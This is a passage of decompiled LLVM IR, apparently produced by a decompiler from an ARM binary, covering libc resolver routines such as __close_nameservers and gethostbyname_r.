.thread6:                                         ; preds = %dec_label_pc_1da0c, %bb50
  store i32 %v3_1d660, i32* %r4.global-to-local, align 4
  store i32 %v6_1d660, i32* @r5, align 4
  store i32 %v18_1d660, i32* @sb, align 4
  store i32 %v21_1d660, i32* @sl, align 4
  store i32 %v24_1d660, i32* @fp, align 4
  %v29_1da24 = load i32, i32* @r0, align 4
  ret i32 %v29_1da24

; uselistorder directives
  uselistorder i32 %v2_1d75c, { 1, 0 }
  uselistorder i32 %v1_1d81c, { 1, 0 }
  uselistorder i32 %v0_1d814, { 1, 0 }
  uselistorder i32 %v4_1d7ac, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v3_1d79c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1d790, { 1, 0 }
  uselistorder i8* %stack_var_-64, { 1, 3, 2, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 14, 7, 8, 9, 11, 10, 19, 12, 13, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0, 4, 5, 13, 11, 6, 7, 8, 9, 10, 12 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 15, 8, 9, 10, 11, 12, 13, 14, 16, 17 }
  uselistorder i32 (i8*)* @__GI_fclose, { 1, 0 }
  uselistorder i32 (i32)* @atol, { 0, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 58, { 0, 8, 4, 9, 5, 6, 1, 2, 3, 7 }
  uselistorder i32 (i32*, i32)* @realloc, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 33, 34, 35, 4, 36, 32, 5, 6, 31, 37, 38, 29, 30, 47, 46, 48, 0, 40, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 39, 19, 20, 21, 22, 1, 2, 3, 23, 24, 25, 26, 27, 28, 41, 42, 43, 44, 45 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i32 (i32)* @skip_and_NUL_space, { 2, 1, 0 }
  uselistorder i8 3, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_25380.1609 to i32), { 0, 2, 1, 3 }
  uselistorder [17 x i8]* @global_var_25748.1742, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1da0c, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_1d97c, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_1d938, { 1, 0 }
  uselistorder label %dec_label_pc_1d930, { 1, 0 }
  uselistorder label %dec_label_pc_1d824, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1d804, { 1, 0 }
  uselistorder label %dec_label_pc_1d814.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1d918.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
  uselistorder label %dec_label_pc_1d6a4, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
}

define i32 @__close_nameservers() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1da6c = load i32, i32* @r4, align 4
  store i32 %v3_1da6c, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_34aa4.1733 to i32), i32* %r4.global-to-local, align 4
  %v2_1da78 = load i32, i32* @global_var_34aa4.1733, align 4
  %v1_1da80 = icmp ne i32 %v2_1da78, ptrtoint ([5 x i8]** @global_var_25794.1767 to i32)
  call void @__pseudo_cond_branch(i1 %v1_1da80, i32 ptrtoint (i32* @global_var_16dac.1607 to i32))
  store i32 ptrtoint (i32* @global_var_34aac.1720 to i32), i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_34aa0.1722 to i32), i32* @r5, align 4
  store i32 0, i32* @global_var_34aa8.1726, align 4
  %v1_1da98 = load i32, i32* %r4.global-to-local, align 4
  %v2_1da98 = inttoptr i32 %v1_1da98 to i32*
  store i32 0, i32* %v2_1da98, align 4
  %v2_1dab01 = load i32, i32* @global_var_34aac.1720, align 4
  store i32 %v2_1dab01, i32* @r4, align 4
  %v2_1dab43 = icmp eq i32 %v2_1dab01, 0
  %v2_1dac47 = load i32, i32* @global_var_34aa0.1722, align 4
  br i1 %v2_1dab43, label %dec_label_pc_1dac4, label %dec_label_pc_1daa0

dec_label_pc_1daa0:                               ; preds = %entry, %dec_label_pc_1daa0
  %v0_1daa8.in = phi i32 [ %v2_1dab0, %dec_label_pc_1daa0 ], [ %v2_1dab01, %entry ]
  %v2_1dac48 = phi i32 [ %v2_1dac4, %dec_label_pc_1daa0 ], [ %v2_1dac47, %entry ]
  %v0_1daa8 = add i32 %v0_1daa8.in, -1
  %v4_1daa4 = mul i32 %v0_1daa8, 4
  %v5_1daa4 = add i32 %v4_1daa4, %v2_1dac48
  %v6_1daa4 = inttoptr i32 %v5_1daa4 to i32*
  %v7_1daa4 = load i32, i32* %v6_1daa4, align 4
  store i32 %v7_1daa4, i32* @r0, align 4
  %v1_1daa8 = load i32, i32* @r6, align 4
  %v2_1daa8 = inttoptr i32 %v1_1daa8 to i32*
  store i32 %v0_1daa8, i32* %v2_1daa8, align 4
  %v0_1daac = call i32 @free()
  %v2_1dab0 = load i32, i32* @global_var_34aac.1720, align 4
  store i32 %v2_1dab0, i32* @r4, align 4
  %v2_1dab4 = icmp eq i32 %v2_1dab0, 0
  %v2_1dac4 = load i32, i32* @global_var_34aa0.1722, align 4
  br i1 %v2_1dab4, label %dec_label_pc_1dac4, label %dec_label_pc_1daa0

dec_label_pc_1dac4:                               ; preds = %dec_label_pc_1daa0, %entry
  %v2_1dac4.lcssa = phi i32 [ %v2_1dac47, %entry ], [ %v2_1dac4, %dec_label_pc_1daa0 ]
  store i32 %v2_1dac4.lcssa, i32* @r0, align 4
  %v0_1dac8 = call i32 @free()
  %v0_1dacc = load i32, i32* @r4, align 4
  %v1_1dacc = load i32, i32* @r5, align 4
  %v2_1dacc = inttoptr i32 %v1_1dacc to i32*
  store i32 %v0_1dacc, i32* %v2_1dacc, align 4
  %v2_1dad0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1dad0, i32* %r4.global-to-local, align 4
  ret i32 %v0_1dac8

; uselistorder directives
  uselistorder i32 %v2_1dab0, { 1, 2, 0 }
  uselistorder i32 %v0_1daa8, { 1, 0 }
  uselistorder i32 %v2_1dac47, { 1, 0 }
  uselistorder i32* @global_var_34aa8.1726, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 0 }
  uselistorder i32* @global_var_34aa0.1722, { 2, 1, 0, 3, 4 }
  uselistorder i32* @global_var_34aac.1720, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32* @global_var_34aa4.1733, { 3, 1, 0, 2, 4, 6, 5 }
  uselistorder label %dec_label_pc_1daa0, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_1db24 = call i32 @__read_etc_hosts_r()
  ret i32 %v0_1db24
}

define i32 @gethostbyname_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp29, i32* %stack_var_0, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v15_1db30 = load i32, i32* @r8, align 4
  %v0_1db38 = load i32, i32* @r2, align 4
  store i32 %tmp29, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_1db44 = load i32, i32* @r0, align 4
  store i32 %v0_1db44, i32* @sl, align 4
  %v2_1db44 = icmp eq i32 %v0_1db44, 0
  %v2_1db48 = inttoptr i32 %tmp29 to i32*
  store i32 0, i32* %v2_1db48, align 4
  %v0_1db4c = load i32, i32* @r1, align 4
  store i32 %v0_1db4c, i32* @r7, align 4
  %v0_1db50 = load i32, i32* @r3, align 4
  store i32 %v0_1db50, i32* @r6, align 4
  br i1 %v2_1db44, label %bb, label %dec_label_pc_1db5c

bb:                                               ; preds = %entry
  %v1_1db54 = load i32, i32* @r5, align 4
  %v2_1db54 = add i32 %v1_1db54, 22
  store i32 %v2_1db54, i32* @r5, align 4
  br label %dec_label_pc_1de18

dec_label_pc_1db5c:                               ; preds = %entry
  %v0_1db5c = call i32 @__GI___errno_location()
  store i32 %v0_1db5c, i32* %r0.global-to-local, align 4
  %v3_1db60 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1db60, i32* %ip.global-to-local, align 4
  %v1_1db64 = inttoptr i32 %v0_1db5c to i32*
  %v2_1db64 = load i32, i32* %v1_1db64, align 4
  store i32 %v2_1db64, i32* @r8, align 4
  %v0_1db68 = load i32, i32* @r5, align 4
  store i32 %v0_1db68, i32* %v1_1db64, align 4
  %v0_1db6c = load i32, i32* %ip.global-to-local, align 4
  store i32 %tmp18, i32* %ip.global-to-local, align 4
  store i32 %v0_1db5c, i32* @r4, align 4
  %v0_1db7c = load i32, i32* @sl, align 4
  store i32 %v0_1db7c, i32* %r0.global-to-local, align 4
  %v0_1db80 = load i32, i32* @r7, align 4
  store i32 %v0_1db80, i32* %r2.global-to-local, align 4
  store i32 %v0_1db38, i32* %r3.global-to-local, align 4
  %v0_1db88 = load i32, i32* @r6, align 4
  %v7_1db90 = call i32 @__get_hosts_byname_r(i32 %v0_1db7c, i32 2, i32 %v0_1db80, i32 %v0_1db38, i32 %v0_1db88, i32 %v0_1db6c, i32 %tmp18)
  store i32 %v7_1db90, i32* %r0.global-to-local, align 4
  store i32 %v7_1db90, i32* @r5, align 4
  %v2_1db94 = icmp eq i32 %v7_1db90, 0
  br i1 %v2_1db94, label %bb34, label %dec_label_pc_1dba0

bb34:                                             ; preds = %dec_label_pc_1db5c
  %v1_1db98 = load i32, i32* @r8, align 4
  %v2_1db98 = load i32, i32* @r4, align 4
  %v3_1db98 = inttoptr i32 %v2_1db98 to i32*
  store i32 %v1_1db98, i32* %v3_1db98, align 4
  br label %dec_label_pc_1de18

dec_label_pc_1dba0:                               ; preds = %dec_label_pc_1db5c
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v1_1dba4 = inttoptr i32 %tmp18 to i32*
  %v2_1dba4 = load i32, i32* %v1_1dba4, align 4
  store i32 %v2_1dba4, i32* %r3.global-to-local, align 4
  %v7_1dba8 = icmp eq i32 %v2_1dba4, 1
  br i1 %v7_1dba8, label %dec_label_pc_1dbc4, label %dec_label_pc_1dbb0

dec_label_pc_1dbb0:                               ; preds = %dec_label_pc_1dba0
  %v7_1dbb0 = icmp eq i32 %v2_1dba4, 4
  br i1 %v7_1dbb0, label %dec_label_pc_1dbe4, label %dec_label_pc_1dbb8

dec_label_pc_1dbb8:                               ; preds = %dec_label_pc_1dbb0
  %v3_1dbb8 = icmp eq i32 %v2_1dba4, -1
  br i1 %v3_1dbb8, label %dec_label_pc_1dbd8, label %dec_label_pc_1de18

dec_label_pc_1dbc4:                               ; preds = %dec_label_pc_1dba0
  %v7_1dbc4 = icmp eq i32 %v7_1db90, 2
  br i1 %v7_1dbc4, label %.thread4, label %bb35

bb35:                                             ; preds = %dec_label_pc_1dbc4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1dbec

.thread4:                                         ; preds = %dec_label_pc_1dbc4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1dbec

dec_label_pc_1dbd8:                               ; preds = %dec_label_pc_1dbb8
  %v0_1dbd8 = load i32, i32* @r4, align 4
  %v1_1dbd8 = inttoptr i32 %v0_1dbd8 to i32*
  %v2_1dbd8 = load i32, i32* %v1_1dbd8, align 4
  store i32 %v2_1dbd8, i32* %r3.global-to-local, align 4
  %v7_1dbdc = icmp eq i32 %v2_1dbd8, 2
  br i1 %v7_1dbdc, label %dec_label_pc_1dbe4, label %dec_label_pc_1de18

dec_label_pc_1dbe4:                               ; preds = %dec_label_pc_1dbd8, %dec_label_pc_1dbb0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1dbec

dec_label_pc_1dbec:                               ; preds = %.thread4, %bb35, %dec_label_pc_1dbe4
  %storemerge2 = phi i32 [ 0, %dec_label_pc_1dbe4 ], [ 0, %bb35 ], [ 1, %.thread4 ]
  store i32 %tmp18, i32* @ip, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1dbf4 = load i32, i32* @r8, align 4
  %v1_1dbf4 = load i32, i32* @r4, align 4
  %v2_1dbf4 = inttoptr i32 %v1_1dbf4 to i32*
  store i32 %v0_1dbf4, i32* %v2_1dbf4, align 4
  %v0_1dbf8 = load i32, i32* @sl, align 4
  %v1_1dbf8 = inttoptr i32 %v0_1dbf8 to i8*
  store i32 %v0_1dbf8, i32* %r0.global-to-local, align 4
  %v0_1dbfc = load i32, i32* %r3.global-to-local, align 4
  %v1_1dbfc = load i32, i32* @ip, align 4
  %v2_1dbfc = inttoptr i32 %v1_1dbfc to i32*
  store i32 %v0_1dbfc, i32* %v2_1dbfc, align 4
  %v3_1dc00 = call i32 @strlen(i8* %v1_1dbf8)
  store i32 %v3_1dc00, i32* %r0.global-to-local, align 4
  %v1_1dc04 = add i32 %v3_1dc00, 1
  store i32 %v1_1dc04, i32* @r4, align 4
  %v0_1dc08 = load i32, i32* @r6, align 4
  %v7_1dc0c = icmp sgt i32 %v0_1dc08, %v1_1dc04
  br i1 %v7_1dc0c, label %dec_label_pc_1dc10, label %dec_label_pc_1de14

dec_label_pc_1dc10:                               ; preds = %dec_label_pc_1dbec
  %v0_1dc10 = load i32, i32* @sl, align 4
  store i32 %v0_1dc10, i32* @r1, align 4
  store i32 %v1_1dc04, i32* @r2, align 4
  store i32 %v0_1db38, i32* @r0, align 4
  %v0_1dc1c = call i32 @memcpy()
  store i32 %v0_1dc1c, i32* %r0.global-to-local, align 4
  %v1_1dc24 = load i32, i32* @r4, align 4
  %v2_1dc24 = add i32 %v1_1dc24, %v0_1db38
  %v1_1dc28 = sub i32 0, %v2_1dc24
  %v1_1dc2c = load i32, i32* @r6, align 4
  %v2_1dc2c = sub i32 %v1_1dc2c, %v1_1dc24
  store i32 %v2_1dc2c, i32* %r2.global-to-local, align 4
  %v1_1dc30 = urem i32 %v1_1dc28, 4
  store i32 %v1_1dc30, i32* %r3.global-to-local, align 4
  %v2_1dc34 = sub i32 %v2_1dc2c, %v1_1dc30
  store i32 %v2_1dc34, i32* @sb, align 4
  %v1_1dc38 = add i32 %v2_1dc34, -8
  store i32 %v1_1dc38, i32* @r5, align 4
  %v7_1dc40 = icmp slt i32 %v1_1dc38, 256
  br i1 %v7_1dc40, label %dec_label_pc_1de14, label %dec_label_pc_1dc44

dec_label_pc_1dc44:                               ; preds = %dec_label_pc_1dc10
  %v2_1dc44 = add i32 %v1_1dc30, %v2_1dc24
  store i32 %v2_1dc44, i32* @fp, align 4
  store i32 %v0_1db38, i32* %ip.global-to-local, align 4
  %v1_1dc4c = add i32 %v2_1dc44, 8
  store i32 %v1_1dc4c, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_1dc54 = add i32 %v2_1dc44, 16
  store i32 %v1_1dc54, i32* @r8, align 4
  %v4_1dc58 = inttoptr i32 %v2_1dc44 to i32*
  store i32 %v0_1db38, i32* %v4_1dc58, align 4
  %v0_1dc5c = load i32, i32* @sl, align 4
  store i32 %v0_1dc5c, i32* %r0.global-to-local, align 4
  %v0_1dc60 = load i32, i32* @r4, align 4
  %v1_1dc60 = load i32, i32* @fp, align 4
  %v2_1dc60 = add i32 %v1_1dc60, 4
  %v3_1dc60 = inttoptr i32 %v2_1dc60 to i32*
  store i32 %v0_1dc60, i32* %v3_1dc60, align 4
  %v0_1dc64 = load i32, i32* @r8, align 4
  %v2_1dc68 = inttoptr i32 %v0_1dc5c to i8*
  %v3_1dc68 = call i32 @inet_aton(i8* %v2_1dc68, i32 %v0_1dc64)
  store i32 %v3_1dc68, i32* %r0.global-to-local, align 4
  %v1_1dc6c = load i32, i32* @r4, align 4
  %v9_1dc6c = icmp eq i32 %v3_1dc68, %v1_1dc6c
  br i1 %v9_1dc6c, label %dec_label_pc_1dcb0, label %dec_label_pc_1dc74

dec_label_pc_1dc74:                               ; preds = %dec_label_pc_1dc44
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_1dc78 = load i32, i32* @r7, align 4
  %v2_1dc78 = add i32 %v1_1dc78, 8
  %v3_1dc78 = inttoptr i32 %v2_1dc78 to i32*
  store i32 2, i32* %v3_1dc78, align 4
  %v0_1dc7c = load i32, i32* %r3.global-to-local, align 4
  %v2_1dc7c = mul i32 %v0_1dc7c, 2
  %v1_1dc80 = load i32, i32* @r7, align 4
  %v2_1dc80 = add i32 %v1_1dc80, 12
  %v3_1dc80 = inttoptr i32 %v2_1dc80 to i32*
  store i32 %v2_1dc7c, i32* %v3_1dc80, align 4
  %v3_1dc84 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1dc84, i32* %r2.global-to-local, align 4
  store i32 %v0_1db38, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* @ip, align 4
  %v0_1dc90 = load i32, i32* @r4, align 4
  store i32 %v0_1dc90, i32* @r5, align 4
  %v0_1dc94 = load i32, i32* @r8, align 4
  %v1_1dc94 = load i32, i32* @fp, align 4
  %v2_1dc94 = add i32 %v1_1dc94, 8
  %v3_1dc94 = inttoptr i32 %v2_1dc94 to i32*
  store i32 %v0_1dc94, i32* %v3_1dc94, align 4
  %v0_1dc98 = load i32, i32* @r7, align 4
  %v1_1dc98 = load i32, i32* %r2.global-to-local, align 4
  %v2_1dc98 = inttoptr i32 %v1_1dc98 to i32*
  store i32 %v0_1dc98, i32* %v2_1dc98, align 4
  %v0_1dc9c = load i32, i32* @r7, align 4
  %v1_1dc9c = inttoptr i32 %v0_1dc9c to i32*
  %v2_1dc9c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v2_1dc9c, i32* %v1_1dc9c, align 4
  %v3_1dc9c = add i32 %v0_1dc9c, 4
  %v4_1dc9c = inttoptr i32 %v3_1dc9c to i32*
  %v5_1dc9c = load i32, i32* @fp, align 4
  store i32 %v5_1dc9c, i32* %v4_1dc9c, align 4
  %v0_1dca0 = load i32, i32* @r6, align 4
  %v1_1dca0 = load i32, i32* @r7, align 4
  %v2_1dca0 = add i32 %v1_1dca0, 16
  %v3_1dca0 = inttoptr i32 %v2_1dca0 to i32*
  store i32 %v0_1dca0, i32* %v3_1dca0, align 4
  %v0_1dca4 = load i32, i32* @r4, align 4
  %v1_1dca4 = load i32, i32* @ip, align 4
  %v2_1dca4 = inttoptr i32 %v1_1dca4 to i32*
  store i32 %v0_1dca4, i32* %v2_1dca4, align 4
  %v0_1dca8 = load i32, i32* @r4, align 4
  %v1_1dca8 = load i32, i32* @r6, align 4
  %v2_1dca8 = add i32 %v1_1dca8, 4
  %v3_1dca8 = inttoptr i32 %v2_1dca8 to i32*
  store i32 %v0_1dca8, i32* %v3_1dca8, align 4
  br label %dec_label_pc_1de18

dec_label_pc_1dcb0:                               ; preds = %dec_label_pc_1dc44
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  %v2_1dcb4 = icmp eq i32 %storemerge2, 0
  br i1 %v2_1dcb4, label %dec_label_pc_1dccc, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1dcb0
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_1dba4, align 4
  br label %dec_label_pc_1de18

dec_label_pc_1dccc:                               ; preds = %dec_label_pc_1dcb0
  store i32 0, i32* @ip, align 4
  %v0_1dcd8 = load i32, i32* @sl, align 4
  store i32 %v0_1dcd8, i32* %r0.global-to-local, align 4
  %v2_1dce0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1dce0, i32* %r2.global-to-local, align 4
  %v2_1dce4 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_1dce4, i32* %r3.global-to-local, align 4
  %v7_1dcf0 = inttoptr i32 %v0_1dcd8 to i8*
  %v8_1dcf0 = call i32 @__dns_lookup(i8* %v7_1dcf0, i32 1, i32 %v2_1dce0, i32 %v2_1dce4)
  store i32 %v8_1dcf0, i32* %r0.global-to-local, align 4
  %v1_1dcf4 = icmp slt i32 %v8_1dcf0, 0
  br i1 %v1_1dcf4, label %.thread, label %dec_label_pc_1dd0c

.thread:                                          ; preds = %dec_label_pc_1dccc
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_1dba4, align 4
  br label %dec_label_pc_1de18

dec_label_pc_1dd0c:                               ; preds = %dec_label_pc_1dccc
  store i32 %tmp12, i32* %r3.global-to-local, align 4
  %v7_1dd10 = icmp eq i32 %tmp12, 1
  br i1 %v7_1dd10, label %dec_label_pc_1dd18, label %dec_label_pc_1ddf0

dec_label_pc_1dd18:                               ; preds = %dec_label_pc_1dd0c
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_1dd30 = load i32, i32* @r5, align 4
  %v2_1dd30 = add i32 %v0_1dd30, -12
  store i32 %v2_1dd30, i32* %r8.global-to-local, align 4
  %v8_1dd30 = icmp slt i32 %v2_1dd30, 0
  br i1 %v8_1dd30, label %bb37, label %dec_label_pc_1dd3c

bb37:                                             ; preds = %dec_label_pc_1dd18
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_1de00

dec_label_pc_1dd3c:                               ; preds = %dec_label_pc_1dd18
  %v0_1dd3c = load i32, i32* @r6, align 4
  store i32 %v0_1dd3c, i32* @r1, align 4
  %v2_1dd40 = add i32 %v0_1dd3c, 12
  store i32 %v2_1dd40, i32* @r0, align 4
  %v2_1dd44 = call i32 @memmove(i32 %v2_1dd40, i32 %v0_1dd3c)
  %v0_1dd48 = load i32, i32* @fp, align 4
  %v1_1dd48 = add i32 %v0_1dd48, 4
  store i32 %v1_1dd48, i32* %r3.global-to-local, align 4
  %v1_1dd4c = load i32, i32* @r4, align 4
  %v2_1dd4c = add i32 %v1_1dd4c, %v1_1dd48
  store i32 %v2_1dd4c, i32* @r5, align 4
  store i32 %v2_1dd4c, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_1dd5c = call i32 @memcpy()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1dd68.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1dd68

dec_label_pc_1dd68:                               ; preds = %dec_label_pc_1dd68, %dec_label_pc_1dd3c
  %v0_1dd68 = phi i32 [ %v0_1dd68.pre, %dec_label_pc_1dd3c ], [ %v1_1dd6c, %dec_label_pc_1dd68 ]
  %v1_1dd68 = load i32, i32* @r6, align 4
  %v7_1dd68 = inttoptr i32 %v1_1dd68 to i32*
  store i32 %v0_1dd68, i32* %v7_1dd68, align 4
  %v0_1dd6c = load i32, i32* @r5, align 4
  %v1_1dd6c = add i32 %v0_1dd6c, 4
  store i32 %v1_1dd6c, i32* @r5, align 4
  %v0_1dd70 = load i32, i32* %r0.global-to-local, align 4
  %v1_1dd70 = add i32 %v0_1dd70, 1
  store i32 %v1_1dd70, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp38 = icmp eq i32 %v1_1dd70, 0
  br i1 %tmp38, label %dec_label_pc_1dd68, label %dec_label_pc_1dd80

dec_label_pc_1dd80:                               ; preds = %dec_label_pc_1dd68
  %v3_1dd80 = load i32, i32* %stack_var_-80, align 4
  store i32 %v3_1dd80, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1dd88 = icmp eq i32 %v3_1dd80, 0
  %v1_1dd8c = load i32, i32* @r6, align 4
  %v5_1dd8c = mul i32 %v1_1dd70, 4
  %v6_1dd8c = add i32 %v1_1dd8c, %v5_1dd8c
  %v7_1dd8c = inttoptr i32 %v6_1dd8c to i32*
  store i32 0, i32* %v7_1dd8c, align 4
  br i1 %v2_1dd88, label %dec_label_pc_1ddbc, label %dec_label_pc_1dd94

dec_label_pc_1dd94:                               ; preds = %dec_label_pc_1dd80
  %v0_1dd94 = load i32, i32* @r4, align 4
  %v1_1dd94 = inttoptr i32 %v0_1dd94 to i8*
  store i32 %v0_1dd94, i32* %r0.global-to-local, align 4
  %v3_1dd98 = call i32 @strlen(i8* %v1_1dd94)
  store i32 %v3_1dd98, i32* %r0.global-to-local, align 4
  %v0_1dd9c = load i32, i32* %r8.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_1dd9c, %v3_1dd98
  br i1 %tmp, label %dec_label_pc_1dda4, label %dec_label_pc_1ddbc

dec_label_pc_1dda4:                               ; preds = %dec_label_pc_1dd94
  %v0_1dda4 = load i32, i32* @r4, align 4
  store i32 %v0_1dda4, i32* @r1, align 4
  %v0_1dda8 = load i32, i32* @r5, align 4
  store i32 %v0_1dda8, i32* %r0.global-to-local, align 4
  %v2_1ddac = inttoptr i32 %v0_1dda8 to i8*
  %v3_1ddac = call i32 @strcpy(i8* %v2_1ddac, i32 %v0_1dda4)
  store i32 %v3_1ddac, i32* %r0.global-to-local, align 4
  %v0_1ddb0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ddbc

dec_label_pc_1ddbc:                               ; preds = %dec_label_pc_1dd94, %dec_label_pc_1dd80, %dec_label_pc_1dda4
  %storemerge1 = phi i32 [ %v0_1ddb0, %dec_label_pc_1dda4 ], [ %v0_1db38, %dec_label_pc_1dd94 ], [ %v0_1db38, %dec_label_pc_1dd80 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1ddc0 = load i32, i32* @r7, align 4
  %v2_1ddc0 = add i32 %v1_1ddc0, 8
  %v3_1ddc0 = inttoptr i32 %v2_1ddc0 to i32*
  store i32 2, i32* %v3_1ddc0, align 4
  %v0_1ddc4 = load i32, i32* %r2.global-to-local, align 4
  %v2_1ddc4 = mul i32 %v0_1ddc4, 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1ddcc = load i32, i32* @r7, align 4
  %v2_1ddcc = add i32 %v1_1ddcc, 12
  %v3_1ddcc = inttoptr i32 %v2_1ddcc to i32*
  store i32 %v2_1ddc4, i32* %v3_1ddcc, align 4
  %v3_1ddd0 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1ddd0, i32* @ip, align 4
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v0_1ddd8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1ddd8, i32* @r5, align 4
  %v0_1dddc = load i32, i32* @r7, align 4
  %v2_1dddc = inttoptr i32 %v3_1ddd0 to i32*
  store i32 %v0_1dddc, i32* %v2_1dddc, align 4
  %v0_1dde0 = load i32, i32* @r7, align 4
  %v1_1dde0 = inttoptr i32 %v0_1dde0 to i32*
  %v2_1dde0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1dde0, i32* %v1_1dde0, align 4
  %v3_1dde0 = add i32 %v0_1dde0, 4
  %v4_1dde0 = inttoptr i32 %v3_1dde0 to i32*
  %v5_1dde0 = load i32, i32* @fp, align 4
  store i32 %v5_1dde0, i32* %v4_1dde0, align 4
  %v0_1dde4 = load i32, i32* @r6, align 4
  %v1_1dde4 = load i32, i32* @r7, align 4
  %v2_1dde4 = add i32 %v1_1dde4, 16
  %v3_1dde4 = inttoptr i32 %v2_1dde4 to i32*
  store i32 %v0_1dde4, i32* %v3_1dde4, align 4
  %v0_1dde8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1dde8 = load i32, i32* %r2.global-to-local, align 4
  %v2_1dde8 = inttoptr i32 %v1_1dde8 to i32*
  store i32 %v0_1dde8, i32* %v2_1dde8, align 4
  br label %dec_label_pc_1de00

dec_label_pc_1ddf0:                               ; preds = %dec_label_pc_1dd0c
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 1, i32* %v1_1dba4, align 4
  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_1de00

dec_label_pc_1de00:                               ; preds = %bb37, %dec_label_pc_1ddbc, %dec_label_pc_1ddf0
  %v3_1de00 = load i32, i32* %stack_var_-80, align 4
  store i32 %v3_1de00, i32* @r0, align 4
  %v0_1de04 = call i32 @free()
  %v3_1de08 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_1de08, i32* @r0, align 4
  %v0_1de0c = call i32 @free()
  store i32 %v0_1de0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1de18

